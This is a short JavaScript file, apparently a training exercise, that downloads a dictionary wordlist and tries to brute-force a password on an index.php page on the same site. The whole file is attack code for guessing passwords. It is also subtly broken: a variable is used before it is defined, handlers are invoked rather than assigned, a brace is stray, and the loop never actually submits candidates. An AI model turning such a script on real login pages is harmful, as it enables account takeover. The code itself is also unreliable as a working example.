

var httpRequest;
var url_pull = "http://docusland.fr/code-academie/js_bruteforce/data/dico.txt";
var url_push = "http://docusland.fr/code-academie/js_bruteforce/index.php?password=" + password;
//var datalist = [];
var str;
var password="";
///
//
///////////////////////REQUÊTE #1///////////////////////////////////
    httpRequest = new XMLHttpRequest();
    httpRequest.onload = pull();
    httpRequest.overrideMimeType('text/xml');
    httpRequest.open('GET', url_pull, false);
    httpRequest.send();

    function pull(){
        var string = httpRequest.responseText;
        str = string.split("\n");
// test
//              for(var i = 0; i < str.length-1; i ++){
//            datalist.push(str[i]);
        }
//            console.log("la taille de la string récupérée est: "+ datalist);
//        return datalist;
    }

///
//
///////////////////////REQUÊTE #2///////////////////////////////////
httpSendRequest = new XMLHttpRequest();
httpSendRequest.onload = push();
httpSendRequest.overrideMimeType('text/xml');
httpSendRequest.open('POST', url_push, false);
httpSendRequest.send();

    function push(){

        var result;
        result = httpSendRequest.responseText;
        console.log("valeur de result:" +result);
        var answer_server = result.match(/Erroneous password/);
        do{
        for(var i = 0; i < str.length-1; i ++){
            password = str[i];
        console.log( "valeur de password: "+ password)
        console.log("la réponse du serveur est :"+ answer_server)
        }
        }while(answer_server == "answer_server");
    alert("The Password is:" + password);
   }
